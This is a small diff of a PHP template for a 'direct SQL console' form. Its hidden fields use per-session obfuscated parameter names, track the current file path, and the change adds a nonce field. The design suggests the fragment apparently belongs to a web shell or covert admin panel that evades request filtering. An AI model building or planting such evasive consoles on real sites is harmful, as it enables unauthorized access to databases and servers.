@@ -55,11 +55,11 @@
 <div class="card">
     <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; DIRECT SQL CONSOLE</h3>
     <form method="post">
-        <!-- Dynamic field names dari session key registry -->
         <input type="hidden" name="<?= h($_sk['do']) ?>" value="qr">
         <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
         <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
         <input type="hidden" name="<?= h($_sk['md']) ?>" value="db">
+        <input type="hidden" name="_ns" value="<?= h($viewData['nonce']) ?>">
         <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(180px, 1fr)); gap:10px; margin-bottom:10px;">
             <input type="text"     id="db_host" name="<?= h($_sk['dh']) ?>" placeholder="Host"          value="<?= h($viewData['db']['formVals']['host']) ?>" required>
             <input type="text"     id="db_name" name="<?= h($_sk['db']) ?>" placeholder="Database Name" value="<?= h($viewData['db']['formVals']['name']) ?>" required>
